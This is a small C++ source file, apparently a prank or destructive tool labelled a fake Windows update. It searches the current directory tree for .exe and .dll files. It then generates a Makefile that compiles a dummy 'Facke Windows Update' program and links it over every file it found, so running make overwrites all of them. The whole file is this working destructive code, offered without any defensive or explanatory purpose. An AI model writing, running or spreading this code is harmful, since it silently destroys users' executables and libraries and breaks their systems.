#include <cstdlib>
#include <fstream>
#include <iostream>
#include <string>

using std::ifstream;
using std::ofstream;
using std::cout;
using std::string;

#define IS_ERROR(B, Mes) \
    if (B) { \
        cout << Mes << "\n\n"; \
        return 1; \
    }

int main(){
    static string out_file = "tmp.txt";
    static string src_file = "fakewinu.cpp";
    static string obj_file = "fakewinu.o";
    system (("echo '' > " + out_file).c_str());
    string tmp = "find -name \"*.exe\" >> " + out_file;
    system(tmp.c_str());
    tmp = "find -name \"*.EXE\" >> " + out_file;
    system(tmp.c_str());
    tmp = "find -name \"*.dll\" >> " + out_file;
    system(tmp.c_str());
    tmp = "find -name \"*.DLL\" >> " + out_file;
    system(tmp.c_str());

    ofstream out;

    #define print(X) \
        out << X "\n";

    out.open("Makefile");
    IS_ERROR(out.fail(), "Fail open write Makefile");
    ifstream in;
    in.open(out_file.c_str());
    IS_ERROR(in.fail(), "Fail open tmp file to read");

    out << "SRCPPS = " << src_file << "\n";
    print("CXXFLAGS = -std=c++11 -fpic -static ");
    print("OBJS = $(SRCPPS:.cpp=.o)");
    print("\n.PHONY: all clean");
    print("all: $(OBJS)");

    while (!in.eof()){
        string exe;
        getline(in, exe);
        if (exe.size() < 3)
            continue;
        out << "\t$(CXX) " << obj_file << " -o " << exe << "\n";
    }
    in.close();
    print("\nclean:");
    out << "\t$(RM) " << src_file << "\n";
    out << "\t$(RM) $(OBJS)\n";
    print("\t$(RM) Makefile");
    out << "\t$(RM) " << out_file << "\n";

    out.close();
    out.open(src_file.c_str());
    IS_ERROR(out.fail(), "Fail open write src file");

    print("#include <iostream>");
    print("using std::cout;");
    print("int main (){");
    print("\tcout << \"Facke Windows Update\\n\\n\";");
    print("\tcout << \"Autor: Diman-PRO@MyProgram.US\\n\";");
    print("}");
    out.close();
}
